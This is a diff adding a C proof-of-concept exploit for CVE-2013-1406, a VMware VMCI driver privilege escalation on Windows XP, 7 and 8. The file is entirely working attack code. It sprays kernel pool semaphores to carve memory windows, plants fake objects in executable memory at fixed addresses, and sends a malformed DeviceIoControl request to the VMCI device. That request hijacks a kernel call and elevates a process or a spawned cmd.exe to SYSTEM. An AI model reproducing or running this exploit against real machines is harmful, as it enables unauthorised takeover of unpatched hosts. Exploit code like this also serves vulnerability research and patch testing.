@@ -1,0 +1,472 @@
+/*
+    CVE-2013-1406 exploitation PoC
+    by Artem Shishkin,
+    Positive Research,
+    Positive Technologies,
+    02-2013
+*/
+
+void __stdcall FireShell(DWORD dwSomeParam)
+{
+    EscalatePrivileges(hProcessToElevate);
+    // Equate the stack and quit the cycle
+#ifndef _AMD64_
+    __asm
+    {
+        pop ebx
+        pop edi
+        push 0xFFFFFFF8
+        push 0xA010043
+    }
+#endif
+}
+
+
+HANDLE LookupObjectHandle(PSYSTEM_HANDLE_INFORMATION_EX pHandleTable, PVOID pObjectAddr, DWORD dwProcessID = 0)
+{
+    HANDLE            hResult = 0;
+    DWORD            dwLookupProcessID = dwProcessID;
+
+    if (pHandleTable == NULL)
+    {
+        printf("Ain't funny\n");
+        return 0;
+    }
+
+    if (dwLookupProcessID == 0)
+    {
+        dwLookupProcessID = GetCurrentProcessId();
+    }
+
+    for (unsigned int i = 0; i < pHandleTable->NumberOfHandles; i++)
+    {
+        if ((pHandleTable->Handles[i].UniqueProcessId == (HANDLE)dwLookupProcessID) && (pHandleTable->Handles[i].Object == pObjectAddr))
+        {
+            hResult = pHandleTable->Handles[i].HandleValue;
+            break;
+        }
+    }
+
+    return hResult;
+}
+
+PVOID LookupObjectAddress(PSYSTEM_HANDLE_INFORMATION_EX pHandleTable, HANDLE hObject, DWORD dwProcessID = 0)
+{
+    PVOID    pResult = 0;
+    DWORD    dwLookupProcessID = dwProcessID;
+
+    if (pHandleTable == NULL)
+    {
+        printf("Ain't funny\n");
+        return 0;
+    }
+
+    if (dwLookupProcessID == 0)
+    {
+        dwLookupProcessID = GetCurrentProcessId();
+    }
+
+    for (unsigned int i = 0; i < pHandleTable->NumberOfHandles; i++)
+    {
+        if ((pHandleTable->Handles[i].UniqueProcessId == (HANDLE)dwLookupProcessID) && (pHandleTable->Handles[i].HandleValue == hObject))
+        {
+            pResult = (HANDLE)pHandleTable->Handles[i].Object;
+            break;
+        }
+    }
+
+    return pResult;
+}
+
+void CloseTableHandle(PSYSTEM_HANDLE_INFORMATION_EX pHandleTable, HANDLE hObject, DWORD dwProcessID = 0)
+{
+    DWORD    dwLookupProcessID = dwProcessID;
+
+    if (pHandleTable == NULL)
+    {
+        printf("Ain't funny\n");
+        return;
+    }
+
+    if (dwLookupProcessID == 0)
+    {
+        dwLookupProcessID = GetCurrentProcessId();
+    }
+
+    for (unsigned int i = 0; i < pHandleTable->NumberOfHandles; i++)
+    {
+        if ((pHandleTable->Handles[i].UniqueProcessId == (HANDLE)dwLookupProcessID) && (pHandleTable->Handles[i].HandleValue == hObject))
+        {
+            pHandleTable->Handles[i].Object = NULL;
+            pHandleTable->Handles[i].HandleValue = NULL;
+            break;
+        }
+    }
+
+    return;
+}
+
+void PoolSpray()
+{
+    // Init used native API function
+    lpNtQuerySystemInformation NtQuerySystemInformation = (lpNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
+    if (NtQuerySystemInformation == NULL)
+    {
+        printf("Such a fail...\n");
+        return;
+    }
+    
+    // Determine object size
+    // xp: 
+    //const DWORD_PTR dwSemaphoreSize = 0x38;
+    // 7:
+    //const DWORD_PTR dwSemaphoreSize = 0x48;
+
+    DWORD_PTR dwSemaphoreSize = 0;
+
+    if (LOBYTE(GetVersion()) == 5)
+    {
+        dwSemaphoreSize = 0x38;
+    }
+    else if (LOBYTE(GetVersion()) == 6)
+    {
+        dwSemaphoreSize = 0x48;
+    }
+
+    unsigned int cycleCount = 0;
+    while (cycleCount < 50000)
+    {
+        HANDLE hTemp = CreateSemaphore(NULL, 0, 3, NULL);
+        if (hTemp == NULL)
+        {
+            break;
+        }
+
+        ++cycleCount;
+    }
+
+    printf("\t[+] Spawned lots of semaphores\n");
+
+    printf("\t[.] Initing pool windows\n");
+    Sleep(2000);
+
+    DWORD dwNeeded = 4096;
+    NTSTATUS status = 0xFFFFFFFF;
+    PVOID pBuf = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
+
+    while (true)
+    {
+        status = NtQuerySystemInformation(SystemExtendedHandleInformation, pBuf, dwNeeded, NULL);
+        if (status != STATUS_SUCCESS)
+        {
+            dwNeeded *= 2;
+            VirtualFree(pBuf, 0, MEM_RELEASE);
+            pBuf = VirtualAlloc(NULL, dwNeeded, MEM_COMMIT, PAGE_READWRITE);
+        }
+        else
+        {
+            break;
+        }
+    };
+
+    HANDLE hHandlesToClose[0x30] = {0};
+    DWORD dwCurPID = GetCurrentProcessId();
+    PSYSTEM_HANDLE_INFORMATION_EX pHandleTable = (PSYSTEM_HANDLE_INFORMATION_EX)pBuf;
+
+    for (ULONG i = 0; i < pHandleTable->NumberOfHandles; i++)
+    {
+        if (pHandleTable->Handles[i].UniqueProcessId == (HANDLE)dwCurPID)
+        {
+            DWORD_PTR    dwTestObjAddr = (DWORD_PTR)pHandleTable->Handles[i].Object;
+            DWORD_PTR    dwTestHandleVal = (DWORD_PTR)pHandleTable->Handles[i].HandleValue;
+            DWORD_PTR    dwWindowAddress = 0;
+            bool        bPoolWindowFound = false;
+
+            UINT iObjectsNeeded = 0;
+            // Needed window size is vmci packet pool chunk size (0x218) divided by
+            // Semaphore pool chunk size (dwSemaphoreSize)
+            iObjectsNeeded = (0x218 / dwSemaphoreSize) + ((0x218 % dwSemaphoreSize != 0) ? 1 : 0);
+        
+            if (
+                    // Not on a page boundary
+                    ((dwTestObjAddr & 0xFFF) != 0) 
+                    && 
+                    // Doesn't cross page boundary
+                    (((dwTestObjAddr + 0x300) & 0xF000) == (dwTestObjAddr & 0xF000)) 
+                )
+            {
+                // Check previous object for being our semaphore
+                DWORD_PTR dwPrevObject = dwTestObjAddr - dwSemaphoreSize;
+                if (LookupObjectHandle(pHandleTable, (PVOID)dwPrevObject) == NULL)
+                {
+                    continue;
+                }
+
+                for (unsigned int j = 1; j < iObjectsNeeded; j++)
+                {
+                    DWORD_PTR dwNextTestAddr = dwTestObjAddr + (j * dwSemaphoreSize);
+                    HANDLE hLookedUp = LookupObjectHandle(pHandleTable, (PVOID)dwNextTestAddr);
+
+                    //printf("dwTestObjPtr = %08X, dwTestObjHandle = %08X\n", dwTestObjAddr, dwTestHandleVal);
+                    //printf("\tdwTestNeighbour = %08X\n", dwNextTestAddr);
+                    //printf("\tLooked up handle = %08X\n", hLookedUp);
+
+                    if (hLookedUp != NULL)
+                    {
+                        hHandlesToClose[j] = hLookedUp;
+
+                        if (j == iObjectsNeeded - 1)
+                        {
+                            // Now test the following object
+                            dwNextTestAddr = dwTestObjAddr + ((j + 1) * dwSemaphoreSize);
+                            if (LookupObjectHandle(pHandleTable, (PVOID)dwNextTestAddr) != NULL)
+                            {
+                                hHandlesToClose[0] = (HANDLE)dwTestHandleVal;
+                                bPoolWindowFound = true;
+
+                                dwWindowAddress = dwTestObjAddr;
+
+                                // Close handles to create a memory window
+                                for (int k = 0; k < iObjectsNeeded; k++)
+                                {
+                                    if (hHandlesToClose[k] != NULL)
+                                    {
+                                        CloseHandle(hHandlesToClose[k]);
+                                        CloseTableHandle(pHandleTable, hHandlesToClose[k]);
+                                    }
+                                }
+                            }
+                            else
+                            {
+                                memset(hHandlesToClose, 0, sizeof(hHandlesToClose));
+                                break;
+                            }
+                        }
+                    }
+                    else
+                    {
+                        memset(hHandlesToClose, 0, sizeof(hHandlesToClose));
+                        break;
+                    }
+                }
+
+                if (bPoolWindowFound)
+                {
+                    printf("\t[+] Window found at %08X!\n", dwWindowAddress);
+                }
+
+            }
+        }
+    }
+
+    VirtualFree(pBuf, 0, MEM_RELEASE);
+
+    return;
+}
+
+void InitFakeBuf(PVOID pBuf, DWORD dwSize)
+{
+    if (pBuf != NULL)
+    {
+        RtlFillMemory(pBuf, dwSize, 0x11);
+    }
+
+    return;
+}
+
+void PlaceFakeObjects(PVOID pBuf, DWORD dwSize, DWORD dwStep)
+{
+    /*
+        Previous chunk size will be always 0x43 and the pool index will be 0, so the last bytes will be 0x0043
+        So, for every 0xXXXX0043 address we must suffice the following conditions:
+
+        lea        edx, [eax+38h]
+        lock    xadd [edx], ecx
+        cmp        ecx, 1
+
+        Some sort of lock at [addr + 38] must be equal to 1. And
+
+        call    dword ptr [eax+0ACh]
+
+        The call site is located at [addr + 0xAC]
+
+        Also fake the object to be dereferenced at [addr + 0x100]
+    */
+
+    if (pBuf != NULL)
+    {
+        for (PUCHAR iAddr = (PUCHAR)pBuf + 0x43; iAddr < (PUCHAR)pBuf + dwSize; iAddr = iAddr + dwStep)
+        {
+            PDWORD pLock = (PDWORD)(iAddr + 0x38);
+            PDWORD_PTR pCallMeMayBe = (PDWORD_PTR)(iAddr + 0xAC);
+            PDWORD_PTR pFakeDerefObj = (PDWORD_PTR)(iAddr + 0x100);
+
+            *pLock = 1;
+            *pCallMeMayBe = (DWORD_PTR)FireShell;
+            *pFakeDerefObj = (DWORD_PTR)pBuf + 0x1000;
+        }
+    }
+
+    return;
+}
+
+void PenetrateVMCI()
+{
+    /*
+
+        VMware Security Advisory
+        Advisory ID:    VMSA-2013-0002
+        Synopsis:    VMware ESX, Workstation, Fusion, and View VMCI privilege escalation vulnerability
+        Issue date:    2013-02-07
+        Updated on:    2013-02-07 (initial advisory)
+        CVE numbers:    CVE-2013-1406
+
+    */
+
+    DWORD dwPidToElevate = 0;
+    HANDLE hSuspThread = NULL;
+
+    bool bXP = (LOBYTE(GetVersion()) == 5);
+    bool b7 = ((LOBYTE(GetVersion()) == 6) && (HIBYTE(LOWORD(GetVersion())) == 1));
+    bool b8 = ((LOBYTE(GetVersion()) == 6) && (HIBYTE(LOWORD(GetVersion())) == 2));
+
+    if (!InitKernelFuncs())
+    {
+        printf("[-] Like I don't know where the shellcode functions are\n");
+        return;
+    }
+
+    if (bXP)
+    {
+        printf("[?] Who do we want to elevate?\n");
+        scanf_s("%d", &dwPidToElevate);
+
+        hProcessToElevate = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPidToElevate);
+        if (hProcessToElevate == NULL)
+        {
+            printf("[-] This process doesn't want to be elevated\n");
+            return;
+        }
+    }
+
+    if (b7 || b8)
+    {
+        // We are unable to change an active process token on-the-fly,
+        // so we create a custom shell suspended (Ionescu hack)
+        STARTUPINFO si = {0};
+        PROCESS_INFORMATION pi = {0};
+
+        si.wShowWindow = TRUE;
+
+        WCHAR cmdPath[MAX_PATH] = {0};
+        GetSystemDirectory(cmdPath, MAX_PATH);
+        wcscat_s(cmdPath, MAX_PATH, L"\\cmd.exe");
+
+        if (CreateProcess(cmdPath, L"", NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == TRUE)
+        {
+            hProcessToElevate = pi.hProcess;
+            hSuspThread = pi.hThread;
+        }
+    }
+
+    HANDLE hVMCIDevice = CreateFile(L"\\\\.\\vmci", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+    if (hVMCIDevice != INVALID_HANDLE_VALUE)
+    {
+        UCHAR BadBuff[0x624] = {0};
+        UCHAR retBuf[0x624] = {0};
+        DWORD dwRet = 0;
+
+        printf("[+] VMCI service found running\n");
+
+        PVM_REQUEST pVmReq = (PVM_REQUEST)BadBuff;
+        pVmReq->Header.RequestSize = 0xFFFFFFF0;
+        
+        PVOID pShellSprayBufStd = NULL;
+        PVOID pShellSprayBufQtd = NULL;
+        PVOID pShellSprayBufStd7 = NULL;
+        PVOID pShellSprayBufQtd7 = NULL;
+        PVOID pShellSprayBufChk8 = NULL;
+
+        if ((b7) || (bXP) || (b8))
+        {
+            /*
+                Significant bits of a PoolType of a chunk define the following regions:
+                0x0A000000 - 0x0BFFFFFF - Standard chunk
+                0x1A000000 - 0x1BFFFFFF - Quoted chunk
+                0x0 - 0xFFFFFFFF - Free chunk - no idea
+
+                Addon for Windows 7:
+                Since PoolType flags have changed, and "In use flag" is now 0x2,
+                define an additional region for Win7:
+
+                0x04000000 - 0x06000000 - Standard chunk
+                0x14000000 - 0x16000000 - Quoted chunk
+            */
+            
+            pShellSprayBufStd = VirtualAlloc((LPVOID)0xA000000, 0x2000000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            pShellSprayBufQtd = VirtualAlloc((LPVOID)0x1A000000, 0x2000000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            pShellSprayBufStd7 = VirtualAlloc((LPVOID)0x4000000, 0x2000000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            pShellSprayBufQtd7 = VirtualAlloc((LPVOID)0x14000000, 0x2000000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+            if ((pShellSprayBufQtd == NULL) || (pShellSprayBufQtd == NULL) || (pShellSprayBufQtd == NULL) || (pShellSprayBufQtd == NULL))
+            {
+                printf("\t[-] Unable to map the needed memory regions, please try running the app again\n");
+                CloseHandle(hVMCIDevice);
+                return;
+            }
+
+            InitFakeBuf(pShellSprayBufStd, 0x2000000);
+            InitFakeBuf(pShellSprayBufQtd, 0x2000000);
+            InitFakeBuf(pShellSprayBufStd7, 0x2000000);
+            InitFakeBuf(pShellSprayBufQtd7, 0x2000000);
+
+            PlaceFakeObjects(pShellSprayBufStd, 0x2000000, 0x10000);
+            PlaceFakeObjects(pShellSprayBufQtd, 0x2000000, 0x10000);
+            PlaceFakeObjects(pShellSprayBufStd7, 0x2000000, 0x10000);
+            PlaceFakeObjects(pShellSprayBufQtd7, 0x2000000, 0x10000);
+
+            if (SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL) == FALSE)
+            {
+                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
+            }
+
+            PoolSpray();
+
+            if (DeviceIoControl(hVMCIDevice, 0x8103208C, BadBuff, sizeof(BadBuff), retBuf, sizeof(retBuf), &dwRet, NULL) == TRUE)
+            {
+                printf("\t[!] If you don't see any BSOD, you're successful\n");
+
+                if (b7 || b8)
+                {
+                    ResumeThread(hSuspThread);
+                }
+            }
+            else
+            {
+                printf("[-] Not this time %d\n", GetLastError());
+            }
+
+            if (pShellSprayBufStd != NULL)
+            {
+                VirtualFree(pShellSprayBufStd, 0, MEM_RELEASE);
+            }
+
+            if (pShellSprayBufQtd != NULL)
+            {
+                VirtualFree(pShellSprayBufQtd, 0, MEM_RELEASE);
+            }
+        }
+
+        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
+
+        CloseHandle(hVMCIDevice);
+    }
+    else
+    {
+        printf("[-] Like I don't see vmware here\n");
+    }
+
+    CloseHandle(hProcessToElevate);
+
+    return;
+}
